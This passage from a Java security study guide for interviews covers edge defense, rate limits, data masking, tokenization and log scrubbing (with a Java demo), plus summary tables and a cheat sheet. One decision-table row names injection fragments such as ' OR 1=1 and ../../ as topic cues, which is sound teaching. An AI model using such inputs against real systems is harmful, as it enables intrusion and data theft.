| **DDoS protection** | Absorbs volumetric attacks before they reach you | CDN/edge providers, cloud DDoS services |
| **Bot management / CAPTCHA** | Separates humans from automated abuse | After N failed logins or on sign-up |
| **Request limits** | Prevents resource-exhaustion attacks | Max body size, header size, JSON depth, GraphQL query depth, timeouts |

```mermaid
flowchart LR
    U[Internet] --> CDN["CDN + DDoS protection + WAF"]
    CDN --> GW["API gateway<br/>TLS, JWT check, API keys,<br/>rate limits, size limits"]
    GW --> SVC["Services<br/>authorization, validation,<br/>parameterized queries"]
    SVC --> DB[("Database<br/>least-privilege user,<br/>encryption at rest")]
```

This is **defense in depth**: every layer assumes the one before it might fail.

**Security-specific rate limits:**

| Endpoint | Suggested limit key | Why |
|---|---|---|
| `POST /login` | Per username **and** per IP | Brute force / credential stuffing |
| `POST /otp/verify` | Per user/session, very low (e.g. 5 attempts) | A 6-digit code has only 1,000,000 possibilities |
| `POST /password-reset` | Per email + per IP | Email bombing, account enumeration |
| `POST /signup` | Per IP + CAPTCHA | Fake account creation |
| Expensive search/export | Per API key / tenant | Cost and DoS |

**Q. Why is rate limiting a security control?** It makes guessing attacks (passwords, OTPs, tokens) and scraping impractical and limits the damage of abusive clients; combined with lockouts, CAPTCHA and alerts, it turns brute force from minutes into centuries.

```
EDGE DEFENSE  CDN/DDoS + WAF -> gateway (TLS, JWT/API keys, rate limits, size limits, CORS) -> services (authz, validation) -> DB (least privilege).
          Rate-limit login per user AND IP, OTP attempts per session, password reset per email; CAPTCHA after failures.
          Defense in depth: each layer assumes the previous one failed. Details: Microservices (gateway), Reliability (rate limiting).
```

---

# 10. Data Protection: Masking, Tokenization and Privacy by Design (Interview Imp - Java)

## 10.1 What Are They?

| Technique | What it does | Reversible? | Example |
|---|---|---|---|
| **Data masking** | Hides part of a value for display or non-production use | Usually no (display masking) | `**** **** **** 1234`, `a***@example.com` |
| **Tokenization** | Replaces a sensitive value with a random **token**; the real value lives only in a secured **vault** | Yes, but only via the vault | Store `tok_8f2a..._1234` instead of the card number |
| **Encryption** | Transforms data with a key (section 6) | Yes, with the key | AES-GCM encrypted column |
| **Pseudonymisation** | Replaces identifiers with consistent pseudonyms | Yes with the mapping | Analytics on `user_93f1` instead of the email |
| **Anonymisation** | Removes the link to a person entirely | No | Aggregated statistics |
| **Homomorphic encryption** | Compute on encrypted data without decrypting it | n/a | Research/specialised use (very slow); know the name |

**Privacy by design** means building these protections in from the start: **collect the minimum** data needed, keep it only as long as needed, restrict who can see it, and make deletion possible.

**Analogy:** A hotel cloakroom. You hand over your coat (sensitive data) and get a numbered ticket (token). The ticket is useless to a thief without access to the cloakroom (vault), and staff at the front desk only ever see ticket numbers.

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **PII** | Personally Identifiable Information: data that identifies a person (name, email, phone, Aadhaar, PAN). |
| **Data masking** | Showing only part of a value, or replacing it with realistic fake data. |
| **Tokenization** | Swapping a sensitive value for a random stand-in whose meaning is stored only in a vault. |
| **Data minimisation** | Collecting and keeping only the data you really need. |
| **PCI DSS** | Card industry security standard; tokenization shrinks which systems it applies to. |
| **GDPR / DPDP Act** | EU and Indian data-protection laws (rights to access, correction, deletion; consent; breach notification). |

---

## 10.2 Why Do We Need It?

- **Breaches happen.** If the orders database stores only **tokens** and **masked** values, a leak exposes far less.
- **Compliance scope:** with tokenization, only the token vault handles real card numbers, so most systems drop out of **PCI DSS** scope.
- **Logs and analytics** are a common leak path: support staff, log platforms and data warehouses shouldn't see raw PII.
- **Laws** (GDPR, India's DPDP Act 2023) require minimisation, purpose limitation, deletion on request and breach reporting.
- **Security logging and monitoring** (OWASP A09) needs logs that are useful **without** containing secrets or PII.

---

## 10.3 How It Works

| Practice | Implementation |
|---|---|
| **Classify data** | Public / internal / confidential / restricted (PII, cards, health) |
| **Minimise** | Don't collect what you don't need; delete on schedule (retention policies) |
| **Mask at display** | APIs and UIs return masked values by default; full values only to authorised roles |
| **Scrub logs** | Logging filters/masking converters for card numbers, emails, tokens, passwords |
| **Tokenize the most sensitive fields** | A dedicated, isolated vault service (or the payment provider's tokens) |
| **Mask non-production data** | Test/staging databases use masked or synthetic data, never real copies |
| **Access control + audit** | Who viewed/exported PII, when (section 2) |
| **Right to erasure** | Know where personal data lives (data map); crypto-shredding for immutable stores |
| **Security logging and alerting** | Log authentication failures, access denials, admin actions; alert on anomalies; protect log integrity |

---

## 10.4 Complete Java Example - Masking, Log Scrubbing and Tokenization

```java
import java.security.SecureRandom;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DataMaskingDemo {
    // ---- Masking: show just enough for a human to recognise the value ----
    static String maskCard(String pan)     { String d = pan.replaceAll("\\D", ""); return "**** **** **** " + d.substring(d.length() - 4); }
    static String maskEmail(String e)      { int at = e.indexOf('@'); return e.charAt(0) + "***" + e.substring(at); }
    static String maskPhone(String p)      { return p.substring(0, 3) + "******" + p.substring(p.length() - 2); }
    static String maskAadhaar(String a)    { return "XXXX XXXX " + a.substring(a.length() - 4); }

    // ---- Log masking: scrub sensitive patterns before a line is written ----
    static final Pattern CARD = Pattern.compile("\\b(?:\\d[ -]?){12,15}(\\d{4})\\b");
    static final Pattern EMAIL = Pattern.compile("([A-Za-z0-9._%+-])[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+)");
    static String scrubLog(String line) {
        Matcher m = CARD.matcher(line);
        line = m.replaceAll("****$1");
        return EMAIL.matcher(line).replaceAll("$1***$2");
    }

    // ---- Tokenization: replace the real value with a random token; the vault keeps the mapping ----
    static class TokenVault {
        private final Map<String, String> tokenToValue = new HashMap<>();
        private final SecureRandom random = new SecureRandom();
        String tokenize(String pan) {
            String last4 = pan.substring(pan.length() - 4);
            String token = "tok_" + Long.toHexString(random.nextLong() & Long.MAX_VALUE) + "_" + last4;   // random: no math link to the PAN
            tokenToValue.put(token, pan);
            return token;
        }
        String detokenize(String token, String callerRole) {
            if (!callerRole.equals("PAYMENT_PROCESSOR")) throw new SecurityException("only the payment processor may detokenize");
            return tokenToValue.get(token);
        }
    }

    public static void main(String[] args) {
        System.out.println("1) Masking for display");
        System.out.println("   card    " + maskCard("4111 1111 1111 1234"));
        System.out.println("   email   " + maskEmail("asha.rao@example.com"));
        System.out.println("   phone   " + maskPhone("+919876543210"));
        System.out.println("   aadhaar " + maskAadhaar("2345 6789 0123"));

        System.out.println("2) Log scrubbing");
        String raw = "payment failed for asha.rao@example.com card=4111-1111-1111-1234 amount=7999";
        System.out.println("   raw    : " + raw);
        System.out.println("   logged : " + scrubLog(raw));

        System.out.println("3) Tokenization");
        TokenVault vault = new TokenVault();
        String token = vault.tokenize("4111111111111234");
        System.out.println("   orders table stores token (looks like tok_<random>_1234): " + token.matches("tok_[0-9a-f]+_1234"));
        System.out.println("   payment processor detokenizes -> " + vault.detokenize(token, "PAYMENT_PROCESSOR"));
        try {
            vault.detokenize(token, "ANALYTICS");
        } catch (SecurityException e) {
            System.out.println("   analytics service detokenizes -> denied: " + e.getMessage());
        }
    }
}
```

**Output:**
```
1) Masking for display
   card    **** **** **** 1234
   email   a***@example.com
   phone   +91******10
   aadhaar XXXX XXXX 0123
2) Log scrubbing
   raw    : payment failed for asha.rao@example.com card=4111-1111-1111-1234 amount=7999
   logged : payment failed for a***@example.com card=****1234 amount=7999
3) Tokenization
   orders table stores token (looks like tok_<random>_1234): true
   payment processor detokenizes -> 4111111111111234
   analytics service detokenizes -> denied: only the payment processor may detokenize
```

What the output shows:
- **Display masking** keeps just enough for users to recognise their own data (last 4 digits, first letter of the email).
- **Log scrubbing** removed the full card number and email from a log line before it was written, while keeping it useful for debugging.
- **Tokenization:** the orders table stores a **random** token (with the last 4 digits for display). Only the **payment processor** role could swap it back for the real card number; the analytics service was refused.

---

## 10.5 Data Protection in Spring and Java

```java
// Mask sensitive fields in JSON responses with a custom Jackson serializer
public class MaskedCardSerializer extends JsonSerializer<String> {
    @Override
    public void serialize(String pan, JsonGenerator gen, SerializerProvider sp) throws IOException {
        gen.writeString("**** **** **** " + pan.substring(pan.length() - 4));
    }
}

public record PaymentMethodDto(
        @JsonSerialize(using = MaskedCardSerializer.class) String cardNumber,
        String brand) {}

// Never log secrets: exclude them from toString() and mark them
public record LoginRequest(String email, @JsonProperty(access = JsonProperty.Access.WRITE_ONLY) String password) {
    @Override public String toString() { return "LoginRequest[email=" + email + ", password=****]"; }
}
```

```xml
<!-- Logback: replace card-number-like sequences before writing (pattern-level masking) -->
<pattern>%d %-5level [%X{traceId}] %logger - %replace(%msg){'\b(?:\d[ -]?){12,15}(\d{4})\b', '****$1'}%n</pattern>
```

```java
// Security event logging (OWASP A09): authentication failures and access denials
@Component
class SecurityAuditListener {
    private static final Logger audit = LoggerFactory.getLogger("SECURITY_AUDIT");

    @EventListener
    void onFailure(AbstractAuthenticationFailureEvent e) {
        audit.warn("login_failed user={} reason={}", e.getAuthentication().getName(), e.getException().getClass().getSimpleName());
    }

    @EventListener
    void onDenied(AuthorizationDeniedEvent<?> e) {
        audit.warn("access_denied user={}", e.getAuthentication().get().getName());
    }
}
```

| Tool / service | Use |
|---|---|
| Payment provider tokens (Stripe, Razorpay vaults) | Never touch raw card numbers at all (best option) |
| Vault Transform/Transit, cloud DLP (Google DLP, Amazon Macie) | Tokenization, format-preserving encryption, PII discovery |
| Database dynamic data masking (SQL Server, Oracle Data Redaction) | Mask columns for certain DB users |
| Hibernate Envers / audit tables | Who changed sensitive data and when |

#### 📘 Terms Explained

| Term | Simple meaning |
|---|---|
| **`@JsonSerialize(using = ...)`** | Jackson annotation selecting a custom serializer for a field. |
| **`JsonProperty.Access.WRITE_ONLY`** | The field is read from requests but never written into responses. |
| **Format-preserving encryption** | Encryption whose output looks like the input format (16 digits stay 16 digits). |
| **DLP** | Data Loss Prevention: tools that discover and protect sensitive data. |
| **Crypto-shredding** | Deleting the key that encrypts a person's data, making it unreadable everywhere. |
| **Security audit log** | Logs of security-relevant events (logins, denials, admin actions) for detection and investigation. |

---

## 10.6 Pitfalls, Interview Questions and Cheat Sheet

| Pitfall | Fix |
|---|---|
| Full PII in logs, error messages, analytics events | Masking at the logging layer; structured logs with explicit safe fields. |
| Copying production data into test environments | Masked/synthetic data. |
| Tokens derived from the value (e.g. plain hash of a card) | Random tokens from a vault (hashes of low-entropy data can be brute-forced). |
| Keeping data forever "just in case" | Retention policies and scheduled deletion. |
| No security logging, or logs nobody watches | Log security events; alert on anomalies; protect and retain logs. |

**Q1. Masking vs tokenization vs encryption?** Masking hides part of a value for display (often irreversible). Tokenization replaces the value with a random token; only a secured vault can map it back. Encryption transforms it with a key; anyone with the key can decrypt.

**Q2. Why does tokenization reduce PCI DSS scope?** Systems that only store tokens never handle real card numbers, so only the vault (or payment provider) is in scope.

**Q3. What is privacy by design?** Building privacy in from the start: data minimisation, purpose limitation, default protection (masking, encryption), limited retention, access control, and the ability to delete.

**Q4. How do you keep sensitive data out of logs?** Don't log request bodies blindly; mask with logging filters/patterns; override `toString()` on sensitive types; review log statements; scan logs for PII.

```
DATA PROTECTION  Classify -> minimise -> mask at display -> scrub logs -> tokenize the most sensitive -> encrypt -> retain briefly -> delete.
          Masking (partial/irreversible) vs tokenization (random token, vault maps back, shrinks PCI scope) vs encryption (key) vs anonymisation.
          Java: Jackson custom serializers, WRITE_ONLY fields, safe toString(), Logback %replace masking; payment provider tokens.
          Security logging (OWASP A09): log auth failures/denials/admin actions, alert, protect logs. GDPR / India DPDP Act.
```

---

## 10.7 Pros and Cons

| Pros | Cons |
|---|---|
| Less sensitive data exposed in logs, test environments and analytics | Masked/tokenized data limits debugging and analytics |
| Smaller compliance scope (PCI: tokenized card numbers) | A token vault is a high-value target and a dependency |
| Supports GDPR/DPDP principles (minimisation, purpose limitation) | Pseudonymised data can still be re-identified if combined carelessly |
| Privacy by design avoids expensive retrofits | Requires discipline across every team and data pipeline |

# 11. How the Security Patterns Fit Together

## 11.1 One-Line Summary of Each

| Pattern | Question it answers | One-line answer |
|---|---|---|
| **Principles** | "What's the mindset?" | Defense in depth, least privilege, zero trust, secure by default, fail securely. |
| **Authentication** | "Who are you?" | Slow salted password hashes, MFA, secure sessions or tokens. |
| **Authorization** | "What may you do?" | Deny by default; roles/attributes; check every object. |
| **OAuth 2.0 / OIDC / SSO** | "How do apps get access without passwords?" | Authorization code + PKCE; client credentials for services. |
| **Tokens / JWT** | "How do I trust a token?" | Pin algorithms; check exp, iss, aud, scope; short lifetimes. |
| **Secret management** | "Where do credentials live?" | In a vault, injected at runtime, rotated, audited. |
| **Encryption** | "How is data protected on the wire and on disk?" | TLS/mTLS everywhere; AES-GCM with KMS envelope keys. |
| **Injection prevention** | "How do I stop input becoming code?" | Validate, parameterize, encode, contain. |
| **Web security** | "How do browsers stay safe?" | CORS allow-lists, CSRF tokens, CSP, secure headers and cookies. |
| **Edge defense** | "What stops abuse before it reaches me?" | WAF, DDoS protection, gateway auth, rate limits. |
| **Data protection** | "How do I limit damage if data leaks?" | Minimise, mask, tokenize, scrub logs, monitor. |

## 11.2 One Request Through Every Layer (Interview Imp - Java)

```mermaid
flowchart LR
    B[Browser / app] -->|"HTTPS + HSTS"| EDGE["CDN + WAF + DDoS"]
    EDGE --> GW["Gateway: TLS, JWT (pinned alg,<br/>aud, exp), rate limits, CORS"]
    GW -->|"mTLS + client-credentials token"| SVC["Service: @PreAuthorize + object checks,<br/>@Valid input, CSRF for cookie apps"]
    SVC -->|"parameterized SQL,<br/>least-privilege DB user"| DB[("DB: TDE + field encryption<br/>(KMS envelope keys)")]
    SVC --> VAULT[(Vault: secrets, dynamic DB creds)]
    SVC --> LOGS["Logs: masked PII,<br/>security audit events"]
    IDP[Keycloak / OIDC IdP] -. "login, MFA, tokens" .-> B
```

| Layer | Patterns |
|---|---|
| User login | Authentication (MFA, password hashing), OAuth2/OIDC + PKCE, SSO |
| Browser | HTTPS/HSTS, CSP, CORS, CSRF, secure cookies, clickjacking protection |
| Edge | WAF, DDoS, gateway, rate limiting, request size limits |
| Service-to-service | mTLS, client-credentials tokens, zero trust |
| Inside each service | Authorization (RBAC/ABAC/object-level), input validation, injection-safe APIs |
| Data | Encryption at rest, tokenization, masking, least-privilege DB access |
| Operations | Secret management, key rotation, dependency scanning, security logging and alerting |

## 11.3 Decision Guide

| If you hear... | Think... |
|---|---|
| "Store passwords", "credential stuffing", "2FA", "session" | Authentication |
| "Admin endpoint", "user saw another user's order", "roles", "permissions" | Authorization (IDOR!) |
| "Login with Google", "SSO", "third-party app access", "service-to-service auth" | OAuth 2.0 / OIDC |
| "JWT", "token expired", "revoke", "alg none" | Tokens |
| "Password in Git", "rotate keys", "Vault" | Secret management |
| "HTTPS", "mTLS", "encrypt the database", "KMS" | Encryption |
| "`' OR 1=1`", "script tag in a comment", "../../", "SSRF" | Injection prevention |
| "Frontend on another domain", "forged form", "iframe", "headers" | Web security (CORS/CSRF/CSP) |
| "Brute force", "bots", "DDoS" | Edge defense / rate limiting |
| "Card numbers", "PII in logs", "GDPR", "test data" | Data protection |

## 11.4 Look-Alike Concepts

| Pair | Difference |
|---|---|
| **Authentication vs authorization** | Who you are vs what you may do. |
| **OAuth 2.0 vs OIDC** | Delegated access (access tokens) vs login identity (ID tokens). |
| **Session vs JWT** | Server-side state, easy revocation vs self-contained, hard revocation. |
| **CORS vs CSRF** | Who may **read** your responses vs stopping forged **requests**. |
| **Hashing vs encryption vs encoding** | One-way vs keyed and reversible vs format only. |
| **Masking vs tokenization** | Partial display hiding vs random substitute with vault lookup. |
| **RBAC vs ABAC** | Roles vs attributes and context. |
| **Input validation vs output encoding** | Reject bad input at entry vs make output safe for its context. |

## 11.5 Security in the Spring Ecosystem

| Pattern | Spring / Java |
|---|---|
| Authentication | `SecurityFilterChain`, `PasswordEncoder` (bcrypt/Argon2), form login, `oauth2Login`, Spring Session, passkeys (recent versions) |
| Authorization | `authorizeHttpRequests`, `@EnableMethodSecurity`, `@PreAuthorize`, `AuthorizationManager` |
| OAuth2 / OIDC | `spring-boot-starter-oauth2-client` / `-resource-server`, Spring Authorization Server, Gateway `TokenRelay` |
| Tokens | `NimbusJwtDecoder` (pinned `jwsAlgorithm`, validators), opaque token introspection |
| Secrets | Spring Cloud Vault, `spring.config.import`, Kubernetes Secrets / External Secrets |
| Encryption | SSL bundles, `RestClientSsl`, JPA `AttributeConverter` with KMS keys, JDK `javax.crypto` |
| Injection | `JdbcTemplate` parameters, JPA named parameters, Bean Validation, Thymeleaf `th:text` |
| Web security | `.cors()`, `.csrf()`, `.headers()` (CSP, HSTS), secure cookie properties |
| Edge | Spring Cloud Gateway + `RequestRateLimiter`, Resilience4j `@RateLimiter` |
| Data protection | Jackson masking serializers, Logback masking, security event listeners |

## 11.6 Comparison Table

| Pattern | Main threat | Key control | Biggest mistake | Interview favourite |
|---|---|---|---|---|
| **Authentication** | Account takeover | Argon2/bcrypt + MFA | Fast/unsalted hashes | How to store passwords |
| **Authorization** | Broken access control | Deny by default + object checks | IDOR | RBAC vs ABAC, IDOR |
| **OAuth2 / OIDC** | Password sharing, token theft | Code + PKCE, client credentials | Implicit/password grants | Flows, OAuth vs OIDC |
| **Tokens** | Forged/stolen tokens | Pinned alg, short exp, aud check | `alg:none`, localStorage | JWT structure, revocation |
| **Secrets** | Credential leaks | Vault + rotation | Secrets in Git | What to do after a leak |
| **Encryption** | Eavesdropping, stolen data | TLS/mTLS, AES-GCM + KMS | ECB, IV reuse, trust-all certs | At rest vs in transit, envelope |
| **Injection** | SQLi, XSS, SSRF | Parameters + encoding | String concatenation | Prevent SQL injection |
| **Web security** | CSRF, XSS, clickjacking | Tokens, SameSite, CSP | CORS `*` with credentials | CORS vs CSRF |
| **Edge defense** | Brute force, DDoS | WAF, rate limits | No login rate limits | Rate limiting as security |
| **Data protection** | Breach impact, compliance | Minimise, mask, tokenize | PII in logs | Masking vs tokenization |

---

# 12. Security Patterns Cheat Sheet

```
PRINCIPLES     CIA + AAA; STRIDE threat modelling; defense in depth, least privilege, separation of duties, zero trust,
               secure by default, fail securely, complete mediation, privacy by design; don't roll your own crypto. OWASP Top 10.
AUTHN          Argon2id/bcrypt/scrypt/PBKDF2 + random salt (+ pepper), constant-time compare; MFA (TOTP RFC 6238, passkeys);
               sessions (Secure/HttpOnly/SameSite, rotate id) vs tokens; generic errors; rate-limit logins; API keys = app identity.
AUTHZ          Deny by default; RBAC / ABAC / ACL / ReBAC / capabilities; function + OBJECT (IDOR) + field checks; DTOs vs mass assignment;
               @PreAuthorize + bean checks; OPA/Cedar.
OAUTH2 / OIDC  Code + PKCE (RFC 7636) for all user clients; client credentials s2s; device flow; rotating refresh tokens;
               state + nonce + exact redirect URIs; implicit/password grants deprecated; OIDC = ID token; SSO; BFF for SPAs.
TOKENS         Pin alg (no none, no HS/RS confusion), JWKS keys only, exp/iss/aud/scope; short-lived; jti deny-list; no secrets in claims.
SECRETS        Vault / cloud secret manager, workload identity, runtime injection, rotation, dynamic creds, audit, gitleaks; leak -> rotate.
ENCRYPTION     TLS 1.3 everywhere + HSTS + mTLS inside; AES-256-GCM (unique IV, tag, AAD); KMS envelope encryption; field-level for PII.
INJECTION      Validate (allow-lists, @Valid) + parameterize (?, :param) + encode output (context) + contain (least privilege, CSP).
               Also path traversal, command injection, SSRF, XXE, deserialization, log injection.
WEB            CORS exact origins (never * + credentials); CSRF tokens + SameSite; CSP; HSTS; nosniff; frame-ancestors; Referrer-Policy.
EDGE           CDN/DDoS + WAF + gateway (auth, limits) + rate limits on login/OTP/reset + CAPTCHA.
DATA           Classify, minimise, mask, scrub logs, tokenize, encrypt, retention, deletion; security audit logging + alerts.
```

### Quick Decision Table

| Need | Use |
|---|---|
| Store user passwords | Argon2id / bcrypt via `DelegatingPasswordEncoder` |
| Stop account takeover | MFA (TOTP/passkeys) + login rate limits |
| Stop users reading others' data | Object-level authorization checks |
| "Login with Google" / corporate SSO | OIDC with authorization code + PKCE (`oauth2Login`) |
| Service-to-service auth | Client credentials tokens + mTLS |
| Validate JWTs | Pinned algorithm, JWKS, `exp`/`iss`/`aud`/scope checks |
| Keep credentials out of code | Vault / secret manager + rotation |
| Protect data on the wire | TLS/HTTPS + HSTS, mTLS internally |
| Protect stored sensitive fields | AES-GCM field encryption with KMS envelope keys, or tokenization |
| Stop SQL injection | Parameterized queries everywhere |
| Stop XSS | Output encoding + CSP + HttpOnly cookies |
| Frontend on another domain | CORS allow-list |
| Cookie-based sessions | CSRF tokens + SameSite cookies |
| Keep PII out of logs | Masking filters and safe `toString()` |

### Top Interview Traps

1. **Never store passwords encrypted or with fast hashes** (MD5/SHA-256); use slow, salted password hashing.
2. **Authentication ≠ authorization;** most real breaches are broken **object-level** authorization (IDOR).
3. **401 = who are you? 403 = you can't do that.**
4. **OAuth 2.0 is for authorization; OIDC adds login.** Use authorization code + PKCE; implicit and password grants are deprecated.
5. **JWTs are signed, not encrypted,** and verifiers must pin the algorithm (`alg:none`, HS/RS confusion).
6. **CORS doesn't prevent CSRF.** CORS controls who may read responses; CSRF needs tokens/SameSite.
7. **Parameterized queries, not escaping,** prevent SQL injection; dynamic column names come from allow-lists.
8. **Kubernetes Secrets are Base64, not encrypted** by default.
9. **A leaked secret must be rotated,** not just deleted from Git.
10. **AES-GCM needs a unique IV per encryption;** never ECB, never disable certificate validation.

> **Related files:** [02_Microservices_Pattern.md](../04_Specialized/02_Microservices_Pattern.md) (access tokens, gateway, mTLS, mesh) · [08_API_Design_Pattern.md](08_API_Design_Pattern.md) (webhook signatures, ProblemDetail errors, idempotency) · [02_Reliability_Pattern.md](02_Reliability_Pattern.md) (rate limiting) · [05_Data_Management_Pattern.md](05_Data_Management_Pattern.md) (event sourcing and crypto-shredding) · [07_Distributed_Systems_Pattern.md](07_Distributed_Systems_Pattern.md) (fencing tokens, locks) · [Java_Complete_Guide.md](../../java/Java_Complete_Guide.md#195-security-essentials-interview-imp) (security essentials) · [00_Design_Patterns_Complete_List.md](../00_Design_Patterns_Complete_List.md) (master list)
